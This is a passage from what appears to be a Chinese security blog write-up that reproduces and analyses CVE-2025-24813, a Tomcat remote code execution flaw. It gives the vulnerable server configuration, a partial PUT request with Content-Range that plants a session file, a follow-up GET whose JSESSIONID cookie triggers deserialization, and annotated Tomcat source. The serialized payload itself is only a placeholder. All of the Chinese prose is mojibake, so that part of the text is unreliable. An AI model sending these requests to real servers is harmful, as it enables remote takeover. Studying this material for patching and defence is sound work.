çš„æ–‡ä»¶ä¼šè¯æŒä¹…åŒ–å¹¶ä¸”ä½¿ç”¨äº†é»˜è®¤çš„ä¼šè¯å­˜å‚¨ä½ç½®ï¼Œéœ€è¦é¢å¤–é…ç½®</li><li>åº”ç”¨ä¸­åŒ…å«ä¸€ä¸ªå­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„åº“ï¼Œæ¯”å¦‚å­˜åœ¨äºç±»è·¯å¾„ä¸‹çš„ commons-collectionsï¼Œæ­¤æ¡ä»¶å–å†³äºä¸šåŠ¡å®ç°æ˜¯å¦ä¾èµ–å­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„åº“</li></ol><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>é¦–å…ˆæ­å»ºä¸€ä¸ªç¯å¢ƒå§~</p><p><a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/src/">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/src/</a></p><p>åŠ â¼Šé»˜è®¤çš„ DefaultServletï¼Œå°†DefaultServletçš„readonlyé…ç½®ä¸ºfalseï¼Œå¯ç”¨å†™å…¥åŠŸèƒ½</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314183557217.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">       &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">       &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">   &lt;/init-param&gt;</span><br></pre></td></tr></table></figure><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314184417111.png" class="" title="This is an example image"><p>ä¸»è¦æ˜¯åŠ å…¥å¦‚ä¸‹å†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™â¼€æ­¥æ˜¯å¼€å¯ Tomcat çš„ Session å‚¨å­˜åŠŸèƒ½</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314183628380.png" class="" title="This is an example image"><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æ¥ä¸‹æ¥å¯åŠ¨ç¯å¢ƒï¼Œåœ¨ç»ˆç«¯è¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/catalina.bat run</span><br></pre></td></tr></table></figure><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314184505385.png" class="" title="This is an example image"><p>ç¯å¢ƒå¼€å¯äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨yakitåˆ›å»ºä¸€ä¸ªjavaåˆ©ç”¨é“¾</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314184049256.png" class="" title="This is an example image"><p>æ¥ä¸‹æ¥åˆ›å»ºä¸€ä¸‹æˆ‘ä»¬çš„åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /xxxxx/session HTTP/1.1  </span><br><span class="line">Host: 192.168.131.32:8080  </span><br><span class="line">Content-Length: 1000  </span><br><span class="line">Content-Range: bytes 0-1000/1200  </span><br><span class="line"></span><br><span class="line">&#123;&#123;ååºåˆ—åŒ–æ–‡ä»¶å†…å®¹)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314184946955.png" class="" title="This is an example image"><p>ç¬¬äºŒä¸ªåŒ…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1  </span><br><span class="line">Host: 192.168.131.32:8080  </span><br><span class="line">Cookie: JSESSIONID=.xxxxx</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆå‘é€ç¬¬ä¸€ä¸ªåŒ…</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314185038055.png" class="" title="This is an example image"><p>å‘ç°è¿™é‡Œä¼šå¤šå‡ºä¸€ä¸ª.xxxxx.session</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å‘é€ç¬¬äºŒä¸ªåŒ…</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250314185113105.png" class="" title="This is an example image"><h2 id="æ·±å…¥æºç åˆ†æ"><a href="#æ·±å…¥æºç åˆ†æ" class="headerlink" title="æ·±å…¥æºç åˆ†æ"></a>æ·±å…¥æºç åˆ†æ</h2><h3 id="æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†DefaultServlet-doPut"><a href="#æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†DefaultServlet-doPut" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†DefaultServlet#doPut"></a>æ–‡ä»¶ä¸Šä¼ éƒ¨åˆ†DefaultServlet#doPut</h3><p>javawebè¿˜æ˜¯å¤ªå·®äº†ï¼Œæ­ä¸ªç¯å¢ƒæ­äº†åŠå¤©ã€‚</p><p>å…ˆç”¨ideaæ­å»ºä¸€ä¸ªæ™®é€šçš„tomcatç¯å¢ƒï¼Œéƒ¨ç½²ç¯å¢ƒçš„æ—¶å€™è¦æ³¨æ„IDEA éƒ¨ç½² Tomcat åœ¨æ–°ç‰ˆæœ‰â¼€äº›æ”¹å˜ï¼Œä¸»è¦æ˜¯ AddFrameWork æŒ‰é’®æ²¡äº†ã€‚å…¨å±€æœå³å¯ã€‚</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321163558374.png" class="" title="This is an example image"><p>ç„¶åæŠŠtomcatæºç ä¸­çš„libä¸­çš„jaråŒ…éƒ½ç²˜è´´åˆ°webé¡¹ç›®çš„WEB-INFçš„libä¸­</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321163524384.png" class="" title="This is an example image"><p>ç„¶åå¯¹libè¿›è¡Œadd as libraryå³å¯ã€‚</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321163815741.png" class="" title="This is an example image"><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321163824169.png" class="" title="This is an example image"><p>æ¥ç€ä¿®æ”¹context.xmlå’Œweb.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬å…³æ³¨ä¸€ä¸‹<strong>DefaultServlet</strong></p><p>â¾ƒå¸¦çš„â¼€ä¸ª Servelet ä¼šå¤„ç†â¼€äº›é»˜è®¤ç±»å‹çš„è¯·æ±‚ï¼Œå¦‚ PUTã€POSTã€GETã€‚</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321164415698.png" class="" title="This is an example image"><p>æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼šCVE-2017-12615ã€CVE-2024-50379å‡æ¶‰åŠè¯¥â½…æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPut</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.readOnly) &#123;</span><br><span class="line">            <span class="built_in">this</span>.sendNotAllowed(req, resp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.getRelativePath(req);</span><br><span class="line">            <span class="type">WebResource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="built_in">this</span>.resources.getResource(path);</span><br><span class="line">            <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="built_in">this</span>.parseContentRange(req, resp);</span><br><span class="line">            <span class="keyword">if</span> (range != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">resourceInputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (range == IGNORE) &#123;</span><br><span class="line">                        resourceInputStream = req.getInputStream();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="built_in">this</span>.executePartialPut(req, range, path);</span><br><span class="line">                        resourceInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(contentFile);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.resources.write(path, (InputStream)resourceInputStream, <span class="literal">true</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (resource.exists()) &#123;</span><br><span class="line">                            resp.setStatus(<span class="number">204</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            resp.setStatus(<span class="number">201</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            resp.sendError(<span class="number">409</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IllegalStateException var15) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (resourceInputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ((InputStream)resourceInputStream).close();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException var14) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆå®¡è®¡ä¸€ä¸‹è¿™æ®µä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (this.readOnly) &#123;</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬ä¹‹å‰å·²ç»åœ¨web.xmlä¸­è®¾ç½®è¿‡äº†readonlyä¸ºfalseï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›å…¥çš„å°±æ˜¯elseéƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebResource resource = this.resources.getResource(path);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè·å¾—çš„ç›´æ¥æ˜¯webæ ¹ç›®å½•ï¼Œç„¶åå°†â½‚ä»¶ä¸Šä¼ ï¼Œè¿™ä¹Ÿæ˜¯æœ€å¼€å§‹çš„ PUT â½‚ä»¶ä¸Šä¼ æ¼æ´ç‚¹ã€‚</p><p>ç„¶åæˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ï¼Œé‡åˆ°ä¸€ä¸ªparseContentRangeå‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Range <span class="title function_">parseContentRange</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">contentRangeHeader</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Content-Range&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (contentRangeHeader == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> IGNORE;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.allowPartialPut) &#123;</span><br><span class="line">            response.sendError(<span class="number">400</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ContentRange</span> <span class="variable">contentRange</span> <span class="operator">=</span> ContentRange.parse(<span class="keyword">new</span> <span class="title class_">StringReader</span>(contentRangeHeader));</span><br><span class="line">            <span class="keyword">if</span> (contentRange == <span class="literal">null</span>) &#123;</span><br><span class="line">                response.sendError(<span class="number">400</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;bytes&quot;</span>.equals(contentRange.getUnits())) &#123;</span><br><span class="line">                response.sendError(<span class="number">400</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Range</span>();</span><br><span class="line">                range.start = contentRange.getStart();</span><br><span class="line">                range.end = contentRange.getEnd();</span><br><span class="line">                range.length = contentRange.getLength();</span><br><span class="line">                <span class="keyword">return</span> range;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ä¸è®¿é—®å¤´Content-Rangeæœ‰å…³ã€‚</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Reference/Headers/Content-Range">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Reference/Headers/Content-Range</a></p><p>æˆ‘ä»¬å…ˆçœ‹çœ‹è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Range: &lt;unit&gt; &lt;range-start&gt;-&lt;range-end&gt;/&lt;size&gt;</span><br><span class="line">Content-Range: &lt;unit&gt; &lt;range-start&gt;-&lt;range-end&gt;/*</span><br><span class="line">Content-Range: &lt;unit&gt; */&lt;size&gt;</span><br></pre></td></tr></table></figure><p>æŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;unit&gt;</span><br><span class="line">    æŒ‡å®šèŒƒå›´çš„å•ä½ã€‚é€šå¸¸æ˜¯å­—èŠ‚ï¼ˆbytesï¼‰ã€‚</span><br><span class="line">&lt;range-start&gt;</span><br><span class="line">    ç»™å®šå•ä½ä¸­çš„ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ‰€è¯·æ±‚èŒƒå›´çš„èµ·å§‹ä½ç½®ï¼ˆä»é›¶å¼€å§‹ï¼ŒåŒ…å«èµ·å§‹ä½ç½®ï¼‰ã€‚</span><br><span class="line">&lt;range-end&gt;</span><br><span class="line">    ç»™å®šå•ä½ä¸­çš„ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ‰€è¯·æ±‚èŒƒå›´çš„ç»“æŸä½ç½®ï¼ˆä»é›¶å¼€å§‹ï¼ŒåŒ…å«ç»“æŸä½ç½®ï¼‰ã€‚</span><br><span class="line">&lt;size&gt;</span><br><span class="line">    æ–‡æ¡£çš„æ€»é•¿åº¦ï¼ˆå¦‚æœæœªçŸ¥ï¼Œåˆ™ä¸º &#x27;*&#x27;ï¼‰ã€‚</span><br></pre></td></tr></table></figure><p>å…¶å®å¯ä»¥ç†è§£ä¸ºå’Œåˆ†å—â¼€ä¸ªæ„æ€ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç®€å•ä¸Šä¼ ä¸€ä¸ªsessionçœ‹çœ‹æ•ˆæœï¼Œç”¨yakitå°±å¥½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT /CVE_2025_24813_war_exploded/aaa/session HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Content-Length: 1000</span><br><span class="line">Content-Range: bytes 0-1000/1200</span><br><span class="line"></span><br><span class="line">testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest</span><br></pre></td></tr></table></figure><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321170408444.png" class="" title="This is an example image"><p>startã€endã€lengthå’Œè¯·æ±‚å¤´å¯¹åº”ï¼Œéšåä¼šè¿›â¼Š executePartialPut å†…ã€‚</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321170557353.png" class="" title="This is an example image"><p>è¿™é‡Œçš„path.replaceä¼šå°†æ–œæ æ›¿æ¢æˆç‚¹å·ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªxxx.sessionæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹å…·ä½“å¤„ç†é€»è¾‘ã€‚</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321170946544.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">randAccessContentFile.setLength(range.length);</span><br><span class="line">randAccessContentFile.seek(range.start);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»¥å°†range.lengthè®¾ç½®ä¸ºæ–‡ä»¶é•¿åº¦ï¼Œä»¥range.startå¼€å§‹å¤„ç†æ–‡ä»¶æµï¼Œä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆlengthä¸€å®šè¦å¤§äºbodyæ€»é•¿åº¦çš„åŸå› ï¼Œå¦åˆ™æ–‡ä»¶æ— æ³•æ­£å¸¸ä¸Šä¼ ã€‚</p><img src="/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20250321175341985.png" class="" title="This is an example image"><p>ä¸Šä¼ åè™½ç„¶è¿”å›çš„æ˜¯409ï¼Œä½†æ˜¯æ–‡ä»¶ç¡®å®æ˜¯ä¼šä¸Šä¼ çš„ï¼</p><p>è‡ªæ­¤æ–‡ä»¶ä¸Šä¼ çš„éƒ¨åˆ†ä¾¿ä»¥å®Œæ¯•äº†ã€‚</p><p>æ¥ä¸‹æ¥æ˜¯ååºåˆ—åŒ–è§¦å‘ç‚¹ã€‚</p><h3 id="ååºåˆ—åŒ–è§¦å‘ç‚¹FileStore-load"><a href="#ååºåˆ—åŒ–è§¦å‘ç‚¹FileStore-load" class="headerlink" title="ååºåˆ—åŒ–è§¦å‘ç‚¹FileStore#load"></a>ååºåˆ—åŒ–è§¦å‘ç‚¹FileStore#load</h3><p>è¿™éƒ¨åˆ†æ˜¯ååºåˆ—åŒ–è§¦å‘ç‚¹ï¼ŒCVE-2020-9484å‡ºâ¾ƒè¿™â¾¥ï¼Œæ‰€ä»¥ä¸éš¾çœ‹å‡ºè¿™å…¶å®æ˜¯â¼€ä¸ªç»„åˆæ¼æ´ï¼Œå½“æ—¶CVE-2020-9484æ˜¯å› ä¸ºå­˜åœ¨</p><p>â½¬å½•ç©¿è¶Šé—®é¢˜æ‰€ä»¥å¯ä»¥ç©¿è¶ŠåŠ è½½â¼€ä¸ªâ¾ƒå®šä¹‰çš„åºåˆ—åŒ–â½‚ä»¶ã€‚</p><p>è§¦å‘ç‚¹å¦‚ä¸‹ï¼š</p><blockquote><p>D:\code\CVE-2025-24813\web\WEB-INF\lib\catalina.jar!\org\apache\catalina\session\FileStore.class</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Session <span class="title function_">load</span><span class="params">(String id)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.file(id);</span><br><span class="line">    <span class="keyword">if</span> (file != <span class="literal">null</span> &amp;&amp; file.exists()) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getManager().getContext();</span><br><span class="line">        <span class="type">Log</span> <span class="variable">contextLog</span> <span class="operator">=</span> context.getLogger();</span><br><span class="line">        <span class="keyword">if</span> (contextLog.isTraceEnabled()) &#123;</span><br><span class="line">            contextLog.trace(sm.getString(<span class="built_in">this</span>.getStoreName() + <span class="string">&quot;.loading&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id, file.getAbsolutePath()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">oldThreadContextCL</span> <span class="operator">=</span> context.bind(Globals.IS_SECURITY_ENABLED, (ClassLoader)<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file.getAbsolutePath());</span><br><span class="line"></span><br><span class="line">            StandardSession var9;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ois = <span class="built_in">this</span>.getObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">StandardSession</span> <span class="variable">session</span> <span class="operator">=</span> (StandardSession)<span class="built_in">this</span>.manager.createEmptySession();</span><br><span class="line">                    session.readObjectData(ois);</span><br><span class="line">                    session.setManager(<span class="built_in">this</span>.manager);</span><br><span class="line">                    var9 = session;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var19) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            